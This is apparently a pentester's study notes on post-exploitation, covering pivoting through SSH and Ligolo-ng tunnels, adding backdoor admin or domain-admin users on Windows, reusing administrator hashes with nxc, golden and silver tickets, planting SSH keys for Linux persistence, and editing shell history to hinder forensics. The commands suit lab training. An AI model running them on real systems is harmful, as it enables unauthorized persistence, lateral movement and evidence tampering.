# Final step - Post-exploitation

<div class="row row-cols-lg-2"><div>

Post-exploitation âœˆï¸ is the last step of the pentester activities. Once we got access to the target, and escalated to administrator, we are trying to **maintain** and **expand** our access to other machines.

Pivoting to another victim is called **lateral movement** ğŸ”“. Target high-value hosts such as SQL or Microsoft Exchange servers.
</div><div>

**Common activities** ğŸ¤–

* ğŸšª Leave a backdoor (persistence)
* ğŸ™Š Deface the public website
* ğŸ•¸ï¸ Redirect users to a malicious website/server
* ğŸ’° Stealing data <small>(files, photos, emails, source code...)</small>
* ğŸ”‘ Stealing credentials <small>(authentication tokens, password, keepass)</small>
* ğŸŒ‹ Mess with timestamp/... to complicate forensics
* ğŸ§¹ Cleanup logs
* âŒ¨ï¸ installing keyloggers
* ğŸ§¨ Edit software configurations/users permissions
* ğŸ² Reset user passwords to access their account
</div></div>

<hr class="sep-both">

## Pivoting To Another Host âœˆï¸

<div class="row row-cols-lg-2"><div>

#### Basic Pivoting Overview

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

If a host has more than one network adapter (`ip a`, `ifconfig`, `ipconfig`), we may be able to use it to move to another network.

We will assume that we have the following hosts, and we want to reach `C` from `A` using `B` as the pivot host.

```yaml!
A: "10.10.X.X " # 10.10.0.0/16
B: "10.129.X.X" # 10.129.0.0/16
C: "172.16.5.5" # 172.16.5/24 
```

We may use:

* **Tunneling** ğŸ“¦: we encapsulate data within another protocol. We mostly see SSH forwarding.
* **Port forwarding** ğŸ›£ï¸: we use an agent listening between our host and the target, and forwarding message from one to the other. 

#### Port forwarding â€” SSH 

We can use `-L`:

```ps
$ ssh -L local:IP:port username@IP
$ ssh -L local:IP:port -L local:IP:port [...] username@IP
```

To access `172.16.5.5:3306`, you can now use the port `3333`.

```ps
$ ssh -L 3333:172.16.5.5:3306 [...]
```

#### SSH Tunneling â€” SOCKS proxy 

We can use [SOCKS](/operating-systems/networking/protocols/socks.md) to make it easier to interact with the target. It allows us to use dynamic port forwarding.

```ps
$ ssh -D 9050 username@IP
```

It has multiple limitations. SOCKS doesn't understand partial packets which is problematic when using `nmap`. SOCKS4 doesn't support UDP.
</div><div>

#### SSH Tunneling â€” Linux Sockets

[![docker_talk_through_me](../../_badges/rootme/app_script/docker_talk_through_me.svg)](https://www.root-me.org/en/Challenges/App-Script/Docker-Talk-through-me)

We can use SSH to tunnel Unix sockets such as docker socket:

```ps
$ ssh -L /tmp/docker.sock:/var/run/docker.sock
$ # and use /tmp/docker.sock
```

#### Ligolo-ng Tunneling

[Ligolo-ng](https://github.com/Nicocha30/ligolo-ng) <small>(2.1k â­)</small> is a simple and powerful fork of [ligolo](https://github.com/sysdream/ligolo) <small>(1.6k â­)</small>. On our host, we need to configure a network interface:

```shell!
$ mkdir -p $HOME/tools/ligolo && cd $HOME/tools/ligolo
$ wget "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz"
$ tar xvf ligolo-ng* && rm -rf ligolo-ng*
$ ./proxy -selfcert # in another terminal, run:
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.5.0/24 dev ligolo # example
$ sudo ip tuntap delete ligolo mode tun # once you're done
```

On the target, download an agent and run it:

```ps
$ wget "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
$ ./agent -connect PROXY_SERVER_IP:11601 -ignore-cert
```

On our proxy server, we can start the tunneling. Now, we can smoothly send traffic to ligolo by defining routes and using them.

```shell!
ligolo> sessions # pick one
ligolo> tunnel_start # ex: ping 172.16.5.5 (see the route add)
```
</div></div>

<hr class="sep-both">

## Windows Post-exploitation

<div class="row row-cols-lg-2"><div>

#### ğŸ’° Stealing data/credentials on Windows ğŸ”‘

You can hunt for more [secrets](/cybersecurity/red-team/s4.privesc/index.md#credential-hunting) now that you have more privileges, but the process is the same.

You can refer to [Windows Pentester Notes](/operating-systems/windows/security/index.md#windows-pentester-notes-) to dump the the SAM database, DPAPI keys, Kerberos tickets, etc.

ğŸ“š As administrator, use `HKEY_USERS` instead of `HKEY_CURRENT_USER`.

<br>

#### ğŸšª Leave a backdoor on Windows

[![adventofcyber2](../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)

Create a new local user.

```ps
PS> net user <username> <password> /add
```

Add a user in the local administrator group.

```ps
PS> net localgroup administrators <username> /add
```

Add a user in the domain admins group.

```ps
PS> net group "domain admins" <username> /add /domain
```
</div><div>

#### ğŸ§¨ Windows Edit software configurations

[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

On hosts connected to active directory, folders such as `%APPDATA%` are shared between machines. If we add a program in `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`, then it will be executed when the users log in.

<br>

#### ğŸ”“ Lateral Movement - Administrator Password Reuse

[![active_directory_enumeration_attacks](../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

We can use [crackmapexec](/cybersecurity/red-team/tools/cracking/auth/cme.md)/[nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md) to test the administrator hash or password on many hosts.

```ps
$ nxc smb --local-auth CIDR -u administrator -H hash
```

If LAPS was implemented, refer to [LAPS](/operating-systems/windows/security/index.md#microsoft-local-administrator-password-solution-laps).

<br>

#### ğŸ”“ Lateral Movement - Find Interesting Users/Groups

Refer to [LDAP](/operating-systems/networking/protocols/ldap.md).

<br>

#### ğŸ”“ Lateral Movement - Golden/Silver Ticket

[![golden_ticket](../../_badges/hacktricks/windows_hardening/active_directory_methodology/golden_ticket.svg)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
[![silver_ticket](../../_badges/hacktricks/windows_hardening/active_directory_methodology/silver_ticket.svg)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

A golden ticket is a forged ticket (TGT) created using the KRBTGT account NTLM password hash, and the information we want <small>(ex: expire in 10 years, associated with account XXX even if disabled/deleted, etc.)</small>.

A silver ticket is a forget ticket (TGS) created using the target service account password hash. It's similar to a golden ticket aside from the fact that it only grants access to one service.
</div></div>

<hr class="sep-both">

## Linux Post-exploitation

<div class="row row-cols-lg-2"><div>

#### ğŸšªğŸ§¨ Create or edit user privileges on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)

* Add a user with uid 0
* Add your user in special groups <small>(shadow, disk, root)</small>
* Edit `/etc/sudoers`

<br>

#### ğŸŒ‹ Complicate forensics on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)

* Remove or edit the shell history file <small>(.bash_history?)</small>
</div><div>

#### ğŸšª Leave a backdoor on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)
[![unbakedpie](../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)
[![teamcw](../../_badges/thm-p/teamcw.svg)](https://tryhackme.com/r/room/teamcw)
[![h4cked](../../_badges/thm-p/h4cked.svg)](https://tryhackme.com/r/room/h4cked)

* Add your SSH key in `[...]/.ssh/authorized_keys`

```ps
$ ssh-keygen -f mykey
$ mkdir -p $TARGET_USER_HOME/.ssh
$ cp mykey.pub $TARGET_USER_HOME/.ssh/authorized_keys
$ chmod 777 $TARGET_USER_HOME/.ssh/authorized_keys
$ ssh target@0 -i mykey
```

* A rootkit is a set of tools used to maintain a high level of privileges on an host by infecting system files. They can be detected using [chkrootkit](https://www.chkrootkit.org/) <small>(simple checks)</small> or [Rootkit Hunter](https://rkhunter.sourceforge.net/) <small>(use an online database)</small>

You can use [Reptile](https://github.com/f0rb1dd3n/Reptile) <small>(2.5k â­)</small>.
</div></div>

<hr class="sep-both">

## ğŸ‘» To-do ğŸ‘»

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Windows

* See also VSS

Linux

* ğŸšª You can give capabilities to a file with `setcap`
* SSH key
</div><div>

* Passive attacks (monitor)
* Active attacks
* Meterpreter
* /.dockerenv (check if we are in a docker)
* KeePass (see exploitation note too?)
* Vulnerable security questions (unencrypted, easy to guess, reset passwords)
* Pass-The-Hash Attack
* rootkit, bootkit
* Credential dumping
* Forensics: clear PowerShell history
</div></div>